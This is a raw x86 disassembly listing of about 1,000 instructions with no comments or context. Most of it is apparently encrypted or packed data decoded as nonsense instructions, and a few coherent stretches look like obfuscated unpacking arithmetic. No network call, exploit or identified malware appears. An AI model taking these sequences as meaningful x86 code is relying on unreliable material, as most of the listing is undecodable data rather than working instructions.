  40d9da:	int    0x6a
  40d9dc:	jo     0x40da06
  40d9de:	call   0xd4ed8eb3
  40d9e3:	mov    ah,0xf0
  40d9e5:	sti    
  40d9e6:	pop    esp
  40d9e7:	mov    ebx,0xbd8c93a3
  40d9ec:	sbb    eax,0x1c942c30
  40d9f1:	retf   
  40d9f2:	mov    esp,0xe1bc8d48
  40d9f7:	sub    DWORD PTR [ecx],edx
  40d9f9:	out    dx,al
  40d9fa:	mov    ah,0x32
  40d9fc:	jmp    0xc29b:0x1ae3f9d4
  40da03:	add    al,0xb4
  40da05:	sub    BYTE PTR [edi],dl
  40da07:	jmp    0x8461:0x34e276b6
  40da0e:	mov    cl,0xea
  40da10:	iret   
  40da11:	inc    DWORD PTR [ebx+ecx*4]
  40da14:	xor    ebx,DWORD PTR ds:0x720a0a7b
  40da1a:	mov    DWORD PTR [eax-0x80],edx
  40da1d:	nop
  40da1e:	out    dx,eax
  40da1f:	popf   
  40da20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da21:	mov    al,0x49
  40da23:	push   ebx
  40da24:	test   BYTE PTR [esi+0x482fd8d9],ch
  40da2a:	mov    DWORD PTR [ebx-0x3],esi
  40da2d:	ins    DWORD PTR es:[edi],dx
  40da2e:	xchg   BYTE PTR [ebx-0x1b],ch
  40da31:	fist   WORD PTR [edx+0x4e097199]
  40da37:	cmp    DWORD PTR [ebp+0x37],eax
  40da3a:	out    dx,eax
  40da3b:	scas   eax,DWORD PTR es:[edi]
  40da3c:	cmp    eax,0x421e7678
  40da41:	fdiv   QWORD PTR [ebx-0x6b066b3e]
  40da47:	xor    BYTE PTR [edi],al
  40da49:	mov    ch,BYTE PTR [esi+0x48f0cf79]
  40da4f:	out    0xbd,eax
  40da51:	and    edx,DWORD PTR [ebp+0x36]
  40da54:	jae    0x40dad2
  40da56:	loope  0x40da2d
  40da58:	out    0x1c,al
  40da5a:	xchg   esp,eax
  40da5b:	cli    
  40da5c:	popa   
  40da5d:	cmp    esp,DWORD PTR [ebp+0x4a]
  40da60:	sub    BYTE PTR [ebx+0x0],cl
  40da63:	xchg   DWORD PTR [edi],edi
  40da65:	(bad)  
  40da66:	stc    
  40da67:	fcomp  st(7)
  40da69:	and    eax,DWORD PTR [esi-0x2a]
  40da6c:	test   BYTE PTR [ebx-0x60],ch
  40da6f:	mov    esi,0x9d290235
  40da74:	sar    DWORD PTR [ecx+0x7d],0xce
  40da78:	popa   
  40da79:	pop    ecx
  40da7a:	fldcw  WORD PTR [ebx+0x55]
  40da7d:	les    edi,FWORD PTR [eax+0x2]
  40da80:	mov    dl,0x99
  40da82:	cmp    DWORD PTR ds:0xffd359ad,edi
  40da88:	stos   DWORD PTR es:[edi],eax
  40da89:	push   edx
  40da8a:	popa   
  40da8b:	mov    esi,0x6ffdb625
  40da90:	adc    ebp,DWORD PTR [eax-0x1e095af5]
  40da96:	rol    BYTE PTR [ebp+0x2a367bc5],cl
  40da9c:	retf   
  40da9d:	or     eax,0xc0f80d
  40daa2:	outs   dx,DWORD PTR ds:[esi]
  40daa3:	cdq    
  40daa4:	inc    ebx
  40daa5:	test   al,0xc1
  40daa7:	sub    DWORD PTR [eax+edx*4+0x50ca4ee1],esp
  40daae:	mov    edx,0xb4120a8
  40dab3:	fistp  WORD PTR [eax+0x4e]
  40dab6:	shr    DWORD PTR ds:0x881f7d84,0xae
  40dabd:	adc    esp,DWORD PTR [edx]
  40dabf:	xchg   DWORD PTR [edx-0x1c75236d],esi
  40dac5:	ret    0xfbc0
  40dac8:	iret   
  40dac9:	inc    esi
  40daca:	int    0x1e
  40dacc:	jl     0x40dac1
  40dace:	int3   
  40dacf:	xchg   edi,eax
  40dad0:	cmp    DWORD PTR [ecx-0x30275179],esp
  40dad6:	and    al,0xa3
  40dad8:	sbb    esp,ecx
  40dada:	pop    ebx
  40dadb:	mov    WORD PTR [eax-0x4a626aee],ds
  40dae1:	mul    DWORD PTR [edx-0x1e]
  40dae4:	ds popf 
  40dae6:	(bad)  
  40dae7:	sti    
  40dae8:	clc    
  40dae9:	lods   al,BYTE PTR ds:[esi]
  40daea:	jnp    0x40db5c
  40daec:	push   ds
  40daed:	rcr    BYTE PTR [edx+0x8394c41],cl
  40daf3:	in     eax,dx
  40daf4:	mov    ebx,0xd644b052
  40daf9:	sub    ebp,DWORD PTR [esi]
  40dafb:	sbb    al,0xce
  40dafd:	aam    0x94
  40daff:	mov    ds:0x421f0681,al
  40db04:	cmp    eax,0x426847bd
  40db09:	jae    0x40db1f
  40db0b:	lea    edi,[ebx-0x4ee2f496]
  40db11:	jle    0x40dad5
  40db13:	(bad)  
  40db14:	retf   0x9f7d
  40db17:	push   ds
  40db18:	ret    
  40db19:	(bad)  
  40db1a:	jns    0x40db03
  40db1c:	in     al,0x7d
  40db1e:	adc    eax,0xaa889f0
  40db23:	push   esp
  40db24:	pushf  
  40db25:	int3   
  40db26:	fisttp WORD PTR [edx-0x4a]
  40db29:	out    dx,eax
  40db2a:	xor    al,0xc6
  40db2c:	sub    cl,BYTE PTR [ebp+0x2a25ec64]
  40db32:	push   0x96a55b25
  40db37:	xchg   edi,eax
  40db38:	gs jp  0x40db5c
  40db3b:	js     0x40daf9
  40db3d:	adc    esi,DWORD PTR [ebx]
  40db3f:	xor    ecx,0xffffffc3
  40db42:	jb     0x40db06
  40db44:	mov    eax,DWORD PTR [ebp+0x8]
  40db47:	imul   ecx,ecx,0x2e01
  40db4d:	mov    esi,DWORD PTR [ebp-0x4]
  40db50:	add    eax,edi
  40db52:	div    esi
  40db54:	mov    edx,DWORD PTR [ebp-0x8]
  40db57:	mov    esi,0x940a7
  40db5c:	sub    ecx,0x16bea86
  40db62:	sub    eax,edx
  40db64:	xor    edx,edx
  40db66:	div    esi
  40db68:	mov    esi,0xdbd
  40db6d:	add    eax,esi
  40db6f:	cmp    ecx,eax
  40db71:	jae    0x40e47e
  40db77:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40db7e:	mov    DWORD PTR [ebp-0x20],0x383e
  40db85:	jmp    0x40de49
  40db8a:	test   DWORD PTR [ebx-0x21],edi
  40db8d:	in     eax,0xdf
  40db8f:	gs jnp 0x40dbed
  40db92:	les    ebp,FWORD PTR [edi+0x61]
  40db95:	jo     0x40db40
  40db97:	sub    al,0x4
  40db99:	push   0x5b
  40db9b:	rcr    BYTE PTR [eax],cl
  40db9d:	sbb    dl,dl
  40db9f:	adc    al,0x18
  40dba1:	sbb    BYTE PTR [edi-0x73],bh
  40dba4:	mov    edi,0x1f407528
  40dba9:	push   edx
  40dbaa:	mov    edi,0x8389ca87
  40dbaf:	jnp    0x40dbfd
  40dbb1:	enter  0xccf5,0x3c
  40dbb5:	xchg   edx,eax
  40dbb6:	add    eax,0xc52acc77
  40dbbb:	or     cl,BYTE PTR [edi+0x7]
  40dbbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbbf:	cdq    
  40dbc0:	cli    
  40dbc1:	stc    
  40dbc2:	jmp    FWORD PTR [ecx-0x61]
  40dbc5:	pop    ebp
  40dbc6:	add    eax,0xfc756607
  40dbcb:	arpl   WORD PTR [ebp+0x31],si
  40dbce:	pop    ss
  40dbcf:	call   0x4c58:0x4443054a
  40dbd6:	cs popa 
  40dbd8:	mov    esp,0xae6c1079
  40dbdd:	xchg   ebx,eax
  40dbde:	pusha  
  40dbdf:	arpl   WORD PTR [eax],ax
  40dbe1:	cmp    al,0xa2
  40dbe3:	je     0x40dc30
  40dbe5:	jmp    0x40dc06
  40dbe7:	xorps  xmm6,xmm2
  40dbea:	call   0x3bf15d75
  40dbef:	out    0xaf,eax
  40dbf1:	iret   
  40dbf2:	loop   0x40dbeb
  40dbf4:	out    dx,eax
  40dbf5:	aaa    
  40dbf6:	mov    eax,0x200f4b1d
  40dbfb:	outs   dx,DWORD PTR ds:[esi]
  40dbfc:	(bad)  
  40dbfd:	jbe    0x40dbc1
  40dbff:	sbb    dh,BYTE PTR [ecx+0x4152aaf9]
  40dc05:	add    ebp,DWORD PTR [ecx-0x5e]
  40dc08:	in     al,0xe9
  40dc0a:	fist   WORD PTR [esi-0x752c96c8]
  40dc10:	lock daa 
  40dc12:	mov    bl,0x73
  40dc14:	cs pop esi
  40dc16:	jmp    0x40dbc0
  40dc18:	cli    
  40dc19:	jmp    0x718ed94c
  40dc1e:	pop    esi
  40dc1f:	movaps xmm4,xmm7
  40dc22:	cmp    edi,DWORD PTR [eax+0x5c321e15]
  40dc28:	xor    al,0x40
  40dc2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc2b:	adc    edi,DWORD PTR [eax-0x3]
  40dc2e:	mov    ds:0x9d097565,al
  40dc33:	push   edx
  40dc34:	sar    ah,0xdc
  40dc37:	jecxz  0x40dc86
  40dc39:	add    edx,DWORD PTR [esi+0x7e]
  40dc3c:	aaa    
  40dc3d:	sub    eax,0x95345b4
  40dc42:	(bad)  
  40dc43:	test   al,0x88
  40dc45:	pop    ss
  40dc46:	arpl   WORD PTR [ebx+0x7b8c88f8],ax
  40dc4c:	add    dh,BYTE PTR [edx]
  40dc4e:	dec    ebp
  40dc4f:	imul   ecx,DWORD PTR [edi+eax*8-0x5c],0x286bb4a8
  40dc57:	out    dx,eax
  40dc58:	enter  0x4f84,0x3a
  40dc5c:	sbb    al,0x8c
  40dc5e:	pop    ds
  40dc5f:	or     BYTE PTR [eax+0x7c],bh
  40dc62:	sbb    BYTE PTR [edx-0xe],bh
  40dc65:	pushf  
  40dc66:	outs   dx,DWORD PTR ds:[esi]
  40dc67:	es cli 
  40dc69:	push   0xffffff8e
  40dc6b:	or     al,0xb0
  40dc6d:	dec    edx
  40dc6e:	mov    eax,0x196eb8c1
  40dc73:	scas   eax,DWORD PTR es:[edi]
  40dc74:	test   DWORD PTR [eax+0x68dc2621],eax
  40dc7a:	rcl    DWORD PTR [edi-0x4c],0x89
  40dc7e:	mov    dh,0x9e
  40dc80:	sub    ebp,ebp
  40dc82:	mov    DWORD PTR [edx+0x51c8553a],ebp
  40dc88:	mov    edx,0x22828253
  40dc8d:	mov    al,ds:0x4387a5ef
  40dc92:	es clc 
  40dc94:	xlat   BYTE PTR ds:[ebx]
  40dc95:	pop    ebp
  40dc96:	(bad)  
  40dc97:	or     al,0x50
  40dc99:	in     eax,dx
  40dc9a:	cmc    
  40dc9b:	mov    ecx,0x726cee7d
  40dca0:	push   cs
  40dca1:	add    bh,BYTE PTR [ebx+0x21d1f9c0]
  40dca7:	je     0x40dd06
  40dca9:	adc    al,BYTE PTR [edi]
  40dcab:	jecxz  0x40dccc
  40dcad:	adc    dh,bl
  40dcaf:	cli    
  40dcb0:	ret    0xd68b
  40dcb3:	aam    0x3b
  40dcb5:	xchg   BYTE PTR [eax-0x1b],cl
  40dcb8:	pop    edx
  40dcb9:	pop    esp
  40dcba:	stos   DWORD PTR es:[edi],eax
  40dcbb:	jecxz  0x40dcc3
  40dcbd:	push   esi
  40dcbe:	cwde   
  40dcbf:	repz or dh,BYTE PTR [esp+eiz*4]
  40dcc3:	mov    DWORD PTR [edx+0x7b55f50e],edx
  40dcc9:	lods   al,BYTE PTR ds:[esi]
  40dcca:	mov    esi,0x50d269a6
  40dccf:	jbe    0x40dcf7
  40dcd1:	inc    ebx
  40dcd2:	in     eax,0xb4
  40dcd4:	fiadd  WORD PTR [esi+0xc]
  40dcd7:	fwait
  40dcd8:	cmp    esi,0x7f
  40dcdb:	mov    cl,0x80
  40dcdd:	icebp  
  40dcde:	ja     0x40dd00
  40dce0:	out    0x56,al
  40dce2:	mov    bh,0xe6
  40dce4:	fnstsw ax
  40dce6:	add    eax,0xa9bb5286
  40dceb:	lods   al,BYTE PTR ss:[esi]
  40dced:	cs jecxz 0x40dd2c
  40dcf0:	ds icebp 
  40dcf2:	pop    esi
  40dcf3:	dec    ebp
  40dcf4:	jge    0x40dd17
  40dcf6:	add    eax,0x59c50470
  40dcfb:	fs daa 
  40dcfd:	jmp    0x40dd79
  40dcff:	and    BYTE PTR [eax],dl
  40dd01:	repnz outs dx,BYTE PTR ds:[esi]
  40dd03:	xchg   ecx,eax
  40dd04:	pop    esi
  40dd05:	mov    ch,0xb7
  40dd07:	xchg   ebp,eax
  40dd08:	dec    edi
  40dd09:	aas    
  40dd0a:	pushf  
  40dd0b:	enter  0x6560,0x8b
  40dd0f:	(bad)  
  40dd10:	pop    edi
  40dd11:	(bad)  
  40dd12:	fdivr  DWORD PTR [edi+esi*8+0x5e2720f2]
  40dd19:	fbld   TBYTE PTR [ecx]
  40dd1b:	pop    edx
  40dd1c:	mov    ah,BYTE PTR [edx-0x3b]
  40dd1f:	(bad)  
  40dd20:	aam    0x3b
  40dd22:	cmp    eax,0xde7a2107
  40dd27:	ins    DWORD PTR es:[edi],dx
  40dd28:	hlt    
  40dd29:	dec    ecx
  40dd2a:	clc    
  40dd2b:	ss dec ecx
  40dd2d:	leave  
  40dd2e:	add    dh,BYTE PTR [edx]
  40dd30:	fsubr  QWORD PTR [edi+0x44]
  40dd33:	repz sbb al,0xe7
  40dd36:	arpl   WORD PTR [ebx-0x62],cx
  40dd39:	xchg   edx,eax
  40dd3a:	jno    0x40dd59
  40dd3c:	cmp    edi,eax
  40dd3e:	aaa    
  40dd3f:	fcomp  QWORD PTR [ebx]
  40dd41:	mov    BYTE PTR [ecx+ebx*8+0x19143c8b],dh
  40dd48:	inc    ebp
  40dd49:	lea    esi,[eax+0x4c552f38]
  40dd4f:	test   DWORD PTR [eax-0x4584fa23],ebp
  40dd55:	(bad)  
  40dd56:	ds hlt 
  40dd58:	pop    esp
  40dd59:	shl    BYTE PTR [ecx+0x6a],1
  40dd5c:	xlat   BYTE PTR ds:[ebx]
  40dd5d:	push   ebx
  40dd5e:	out    0x76,eax
  40dd60:	mov    ch,BYTE PTR [edx]
  40dd62:	call   0xaecc262a
  40dd67:	inc    esi
  40dd68:	sub    eax,DWORD PTR [esi-0x3c]
  40dd6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd6c:	jb     0x40dddd
  40dd6e:	ss mov bh,0x44
  40dd71:	int    0xdd
  40dd73:	push   ebp
  40dd74:	push   ss
  40dd75:	jbe    0x40ddc5
  40dd77:	outs   dx,BYTE PTR ds:[esi]
  40dd78:	mov    WORD PTR ds:0xbe6fd62d,es
  40dd7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd7f:	ins    DWORD PTR es:[edi],dx
  40dd80:	icebp  
  40dd81:	adc    ebp,DWORD PTR [edi+0x7bf47622]
  40dd87:	xor    al,0x6a
  40dd89:	ja     0x40dd9b
  40dd8b:	mov    eax,0x450da6df
  40dd90:	(bad)  
  40dd91:	leave  
  40dd92:	xor    edi,DWORD PTR [edi]
  40dd94:	dec    ebp
  40dd95:	int    0xb6
  40dd97:	push   es
  40dd98:	adc    esp,DWORD PTR [edi]
  40dd9a:	or     esp,DWORD PTR [edx-0x563fc798]
  40dda0:	and    ebx,DWORD PTR [edi+edi*2+0x77e7c22e]
  40dda7:	mov    ecx,0x4077be1b
  40ddac:	pop    edx
  40ddad:	aas    
  40ddae:	jne    0x40dd85
  40ddb0:	cmp    bl,cl
  40ddb2:	loope  0x40dd51
  40ddb4:	test   al,0xd8
  40ddb6:	out    0xf6,eax
  40ddb8:	imul   eax,ebp,0xf49a8fc1
  40ddbe:	mov    al,ds:0xf5692770
  40ddc3:	and    edx,0x54
  40ddc6:	call   DWORD PTR [ebx+0x2ecb0a9e]
  40ddcc:	sbb    al,0xac
  40ddce:	mov    dl,0x26
  40ddd0:	jp     0x40de28
  40ddd2:	and    ebx,DWORD PTR [ecx]
  40ddd4:	pop    ebp
  40ddd5:	loopne 0x40de20
  40ddd7:	xchg   ebx,eax
  40ddd8:	adc    esp,DWORD PTR [ebp+edx*1+0x1f47ae41]
  40dddf:	ficom  DWORD PTR [esi-0x67e344b0]
  40dde5:	in     eax,dx
  40dde6:	bound  edx,QWORD PTR [ebx-0x5e]
  40dde9:	fstp   TBYTE PTR ds:0xbef9d3e1
  40ddef:	imul   ebp,DWORD PTR [ebp-0x49e59f0f],0x1e8e2fe7
  40ddf9:	int    0x7e
  40ddfb:	mov    ebp,0xe3ab73a7
  40de00:	dec    ebx
  40de01:	inc    eax
  40de02:	add    BYTE PTR [eax+0x2],dh
  40de05:	mov    ?,esi
  40de07:	and    al,0x71
  40de09:	(bad)  
  40de0a:	stos   DWORD PTR es:[edi],eax
  40de0b:	cmp    bh,BYTE PTR [ebx]
  40de0d:	lods   eax,DWORD PTR ds:[esi]
  40de0e:	bound  edx,QWORD PTR [eax-0x2c92078e]
  40de14:	sbb    esi,edx
  40de16:	or     esp,DWORD PTR [ecx-0x7]
  40de19:	data16 jnp 0x40ddd2
  40de1c:	sbb    eax,0x28262558
  40de21:	jnp    0x40de70
  40de23:	dec    edx
  40de24:	clc    
  40de25:	xchg   BYTE PTR [esi-0x25616543],bh
  40de2b:	sub    bl,BYTE PTR [edi-0x761b17ac]
  40de31:	xor    ch,bh
  40de33:	jo     0x40dde4
  40de35:	jae    0x40dde1
  40de37:	push   ebx
  40de38:	cli    
  40de39:	scas   eax,DWORD PTR es:[edi]
  40de3a:	mov    al,ds:0xa9350175
  40de3f:	leave  
  40de40:	xchg   esi,eax
  40de41:	mov    edi,0x403a5efa
  40de46:	(bad)  
  40de47:	shl    BYTE PTR [eax],cl
  40de49:	mov    DWORD PTR [ebp-0x24],0x3a3a
  40de50:	mov    DWORD PTR [ebp-0x14],0x13cd
  40de57:	xor    edx,edx
  40de59:	mov    DWORD PTR [ebp-0x18],0x187
  40de60:	mov    DWORD PTR [ebp-0x28],0x3224
  40de67:	mov    eax,DWORD PTR [ebp-0x28]
  40de6a:	push   0x6
  40de6c:	pop    ebx
  40de6d:	div    ebx
  40de6f:	mov    edx,eax
  40de71:	mov    eax,ds:0x422538
  40de76:	mov    eax,DWORD PTR [eax+0x1d0]
  40de7c:	sub    eax,edx
  40de7e:	mov    edx,DWORD PTR [ebp-0x24]
  40de81:	mov    ebx,DWORD PTR [ebp-0x20]
  40de84:	imul   edx,ebx
  40de87:	mov    ebx,DWORD PTR [ebp-0x1c]
  40de8a:	xor    edx,ebx
  40de8c:	sub    edx,0x26bd
  40de92:	add    eax,ecx
  40de94:	and    edx,0x7126
  40de9a:	mov    ebx,ecx
  40de9c:	sub    ebx,edx
  40de9e:	mov    edx,DWORD PTR [ebp-0x18]
  40dea1:	sub    eax,edx
  40dea3:	mov    edx,DWORD PTR [ebp-0x14]
  40dea6:	sub    eax,edx
  40dea8:	mov    edx,DWORD PTR [ebp+0xc]
  40deab:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40deb2:	mov    BYTE PTR [eax-0xbb5],dl
  40deb8:	jmp    0x40e17c
  40debd:	rep stos BYTE PTR es:[edi],al
  40debf:	add    bl,BYTE PTR [ecx]
  40dec1:	mov    ebx,0x23aae2a0
  40dec6:	inc    ebp
  40dec7:	leave  
  40dec8:	jl     0x40dec0
  40deca:	repnz xchg edi,eax
  40decc:	mov    esp,0x1818cc14
  40ded1:	rcl    BYTE PTR [eax+ebx*1],cl
  40ded4:	sbb    BYTE PTR [eax+0x74],cl
  40ded7:	adc    al,0xdf
  40ded9:	inc    eax
  40deda:	sub    bl,BYTE PTR [esi-0x23c65353]
  40dee0:	xchg   ch,ch
  40dee2:	mov    esi,0x34699f3a
  40dee7:	loopne 0x40de75
  40dee9:	and    BYTE PTR [ebp+0x3817c4f5],cl
  40deef:	push   ss
  40def0:	adc    eax,DWORD PTR [ebp+0x62]
  40def3:	ret    
  40def4:	mov    ch,0x6e
  40def6:	add    ch,ch
  40def8:	push   es
  40def9:	(bad)  
  40defa:	hlt    
  40defb:	(bad)  
  40defc:	call   0x17f8:0xc018e1f0
  40df03:	inc    ebx
  40df04:	iret   
  40df05:	pop    ds
  40df06:	xchg   ebx,eax
  40df07:	add    DWORD PTR [esi-0x17],0x36
  40df0b:	loope  0x40df59
  40df0d:	push   ss
  40df0e:	push   ecx
  40df0f:	scas   eax,DWORD PTR es:[edi]
  40df10:	xchg   BYTE PTR [edx-0x1b900744],dh
  40df16:	sahf   
  40df17:	icebp  
  40df18:	mov    edx,0x4ab4baac
  40df1d:	and    DWORD PTR [ebp+0x28],esp
  40df20:	sbb    ecx,edx
  40df22:	sbb    eax,0xfcb95
  40df27:	mov    eax,ds:0xb238e2e4
  40df2c:	push   ss
  40df2d:	inc    ebx
  40df2e:	jno    0x40def3
  40df30:	neg    DWORD PTR [edx]
  40df32:	mov    dh,0xb4
  40df34:	leave  
  40df35:	mov    eax,ds:0xc415afb3
  40df3a:	push   0xfffffff3
  40df3c:	cmc    
  40df3d:	rol    esi,1
  40df3f:	out    dx,eax
  40df40:	aas    
  40df41:	lea    esi,[eax+0x37]
  40df44:	repnz in al,dx
  40df46:	mov    DWORD PTR [eax+0x68],esp
  40df49:	stc    
  40df4a:	jle    0x40df4e
  40df4c:	mov    BYTE PTR [ebx-0x2d],ah
  40df4f:	or     eax,0xa1c23436
  40df54:	sub    edi,ebx
  40df56:	outs   dx,BYTE PTR ds:[esi]
  40df57:	cmp    BYTE PTR [ebx-0x7a7338eb],bl
  40df5d:	ret    
  40df5e:	dec    eax
  40df5f:	and    al,0x4a
  40df61:	add    DWORD PTR [ebx],eax
  40df63:	pop    ds
  40df64:	not    DWORD PTR [ebx+ebp*8+0x26]
  40df68:	jae    0x40dfc3
  40df6a:	add    ah,ah
  40df6c:	add    eax,0x6f05fca
  40df71:	mov    dh,0x9c
  40df73:	lahf   
  40df74:	jle    0x40df25
  40df76:	adc    BYTE PTR [ecx-0x30a3a630],ch
  40df7c:	xchg   BYTE PTR [edi+0x1],bh
  40df7f:	xchg   esi,eax
  40df80:	inc    eax
  40df81:	daa    
  40df82:	addr16 pop esi
  40df84:	cmp    al,BYTE PTR [eax-0x60d1e896]
  40df8a:	or     al,BYTE PTR [ecx+0x1fc4b7c6]
  40df90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df91:	add    BYTE PTR [eax+ebx*4+0xa],0x93
  40df96:	mov    bh,0xd3
  40df98:	popa   
  40df99:	mov    edi,0x589417eb
  40df9e:	add    al,0xa5
  40dfa0:	loop   0x40dff4
  40dfa2:	sbb    sp,dx
  40dfa5:	xchg   edx,eax
  40dfa6:	jmp    0xdbf77c32
  40dfab:	pop    edx
  40dfac:	ret    0x6204
  40dfaf:	retf   0xcdf
  40dfb2:	aaa    
  40dfb3:	sub    ch,BYTE PTR [edi-0x452570c4]
  40dfb9:	jmp    0xaea7:0xf7576c44
  40dfc0:	xchg   esp,eax
  40dfc1:	xlat   BYTE PTR ds:[ebx]
  40dfc2:	sub    eax,0x5c6dc0a9
  40dfc7:	pushf  
  40dfc8:	pop    edi
  40dfc9:	loopne 0x40e022
  40dfcb:	mov    ebx,0xaab8c841
  40dfd0:	pop    edi
  40dfd1:	or     DWORD PTR [esi-0x5127524c],0xffffffce
  40dfd8:	jne    0x40e032
  40dfda:	es test eax,0x699aac74
  40dfe0:	jmp    0x92d8:0xba01502
  40dfe7:	xchg   esp,eax
  40dfe8:	popa   
  40dfe9:	dec    DWORD PTR [edx+0x3a]
  40dfec:	lds    ecx,FWORD PTR [edi+edi*2]
  40dfef:	arpl   WORD PTR [edx],dx
  40dff1:	call   0xdbab:0xb9d25195
  40dff8:	fsubr  QWORD PTR [esp+edx*4]
  40dffb:	call   0xd4d38aef
  40e000:	gs test al,0xe9
  40e003:	mov    dh,0x98
  40e005:	sub    al,0x3
  40e007:	(bad)  
  40e008:	mov    al,ds:0xad82ca8
  40e00d:	mov    bh,0x7c
  40e00f:	in     eax,dx
  40e010:	inc    ebx
  40e011:	add    ax,0xc3e6
  40e015:	mov    ebx,0x12eaf85f
  40e01a:	out    0x3b,eax
  40e01c:	out    0xf2,al
  40e01e:	aad    0xb7
  40e020:	mov    al,ds:0x685cd263
  40e025:	xchg   ebp,eax
  40e026:	inc    eax
  40e027:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e028:	ret    0x4073
  40e02b:	sub    ebp,DWORD PTR [eax]
  40e02d:	and    edi,DWORD PTR [eax-0x1822a0c]
  40e033:	jp     0x40e039
  40e035:	xchg   edx,eax
  40e036:	fwait
  40e037:	inc    eax
  40e038:	fwait
  40e039:	je     0x40e009
  40e03b:	sbb    eax,0x96fc81d
  40e040:	ds mov cl,ah
  40e043:	jae    0x40e07b
  40e045:	popa   
  40e046:	js     0x40e09a
  40e048:	xchg   edi,eax
  40e049:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e04b:	pop    DWORD PTR [esi+edi*2]
  40e04e:	enter  0x8105,0x1e
  40e052:	loope  0x40e072
  40e054:	adc    BYTE PTR [bp+si+0x9cd],bl
  40e059:	jmp    0x40e09d
  40e05b:	add    ebx,DWORD PTR [eax]
  40e05d:	mov    ch,0x7c
  40e05f:	add    BYTE PTR [esi-0x35],cl
  40e062:	pop    ss
  40e063:	dec    ebp
  40e064:	imul   edi,DWORD PTR [eax+0x16],0x4c6f80ab
  40e06b:	push   ds
  40e06c:	sahf   
  40e06d:	fcom   DWORD PTR [ebx-0x27]
  40e070:	pushf  
  40e071:	dec    ebp
  40e072:	jge    0x40e08a
  40e074:	and    DWORD PTR [esi+0x12bf2496],esi
  40e07a:	call   0xeadf:0x41b8a930
  40e081:	imul   ecx,DWORD PTR [ebp-0x35],0xa7f2fd8
  40e088:	and    DWORD PTR [edx+0x3fb4f6f7],eax
  40e08e:	adc    dl,BYTE PTR [ebp-0x30a33e7c]
  40e094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e095:	rcl    BYTE PTR [edi+0x1e979437],0x16
  40e09c:	hlt    
  40e09d:	sbb    ah,BYTE PTR [ecx-0x6febbbf6]
  40e0a3:	xor    eax,0xe9fee0e1
  40e0a8:	mov    ds:0xdd161f13,eax
  40e0ad:	push   edx
  40e0ae:	cmp    al,0x92
  40e0b0:	sahf   
  40e0b1:	(bad)  
  40e0b2:	scas   al,BYTE PTR es:[edi]
  40e0b3:	lods   eax,DWORD PTR ds:[esi]
  40e0b4:	pushf  
  40e0b5:	(bad)  
  40e0b6:	icebp  
  40e0b7:	fsub   DWORD PTR [ecx]
  40e0b9:	adc    DWORD PTR [eax+0x79],ebp
  40e0bc:	fcom   st(6)
  40e0be:	adc    ebx,DWORD PTR [eax+0x69]
  40e0c1:	xchg   edx,eax
  40e0c2:	inc    ebp
  40e0c3:	or     esp,DWORD PTR [ecx+0x22966ad4]
  40e0c9:	out    dx,eax
  40e0ca:	and    DWORD PTR [ebp-0x64ff7943],0xf92af89c
  40e0d4:	fimul  DWORD PTR [eax+0x60981950]
  40e0da:	lahf   
  40e0db:	retf   
  40e0dc:	dec    ebp
  40e0dd:	out    0x44,eax
  40e0df:	sbb    ebx,eax
  40e0e1:	dec    ebx
  40e0e2:	test   eax,0xacb7a316
  40e0e7:	and    ch,BYTE PTR [edx+0x13]
  40e0ea:	add    BYTE PTR [ecx-0xa03982d],0xae
  40e0f1:	js     0x40e10b
  40e0f3:	and    DWORD PTR [ebx-0x51],edx
  40e0f6:	and    eax,0x88ac7e7e
  40e0fb:	and    al,0x31
  40e0fd:	mov    BYTE PTR [eax],dh
  40e0ff:	push   eax
  40e100:	dec    esp
  40e101:	sbb    BYTE PTR [eax],dl
  40e103:	sub    DWORD PTR [ebp+0x14],eax
  40e106:	fisub  DWORD PTR [edi+esi*4-0x693c3795]
  40e10d:	pop    ebx
  40e10e:	dec    esp
  40e10f:	sbb    edx,DWORD PTR [eax+0x7b8bebf8]
  40e115:	aad    0xb5
  40e117:	and    DWORD PTR [eax+eiz*1-0x3c],edi
  40e11b:	inc    DWORD PTR [edx]
  40e11d:	jmp    0x40e100
  40e11f:	mov    ebx,0x4a5ac443
  40e124:	mov    cl,0x7
  40e126:	cwde   
  40e127:	out    dx,al
  40e128:	out    0x60,al
  40e12a:	mov    dl,0x94
  40e12c:	rol    DWORD PTR [esi+0x369fbadb],0x71
  40e133:	loope  0x40e0b6
  40e135:	push   0xffffffef
  40e137:	and    al,ah
  40e139:	dec    edx
  40e13a:	push   cs
  40e13b:	leave  
  40e13c:	fst    QWORD PTR [esi-0x50fcae4f]
  40e142:	pushf  
  40e143:	(bad)  
  40e145:	cmp    eax,0xb6780950
  40e14a:	mov    bh,0x3d
  40e14c:	sbb    bl,BYTE PTR [ecx+0x7cefddf4]
  40e152:	xlat   BYTE PTR ds:[ebx]
  40e153:	sbb    ch,cl
  40e155:	and    esi,ebx
  40e157:	pop    edi
  40e158:	fistp  QWORD PTR [eax-0x4a]
  40e15b:	jecxz  0x40e151
  40e15d:	rcl    BYTE PTR [ebp+ecx*4+0x1e736779],0xe8
  40e165:	call   DWORD PTR [esp+ebp*4]
  40e168:	retf   
  40e169:	outs   dx,BYTE PTR ds:[esi]
  40e16a:	ror    dl,1
  40e16c:	push   0x7e
  40e16e:	inc    ebx
  40e16f:	xor    DWORD PTR [ebp-0x42],0xffffff84
  40e173:	jge    0x40e0fa
  40e175:	js     0x40e15a
  40e177:	lds    ecx,FWORD PTR [ebp-0x74be7b02]
  40e17d:	inc    ebp
  40e17e:	lock xor eax,0xffffe1ce
  40e184:	add    eax,DWORD PTR [ebp-0xc]
  40e187:	jmp    0x40e44b
  40e18c:	sub    dh,ah
  40e18e:	mov    BYTE PTR [ecx],ah
  40e190:	inc    esi
  40e191:	pop    ds
  40e192:	and    dh,bl
  40e194:	leave  
  40e195:	out    0x4b,eax
  40e197:	jle    0x40e1a4
  40e199:	pop    ecx
  40e19a:	loope  0x40e21a
  40e19c:	into   
  40e19d:	enter  0x1818,0xd2
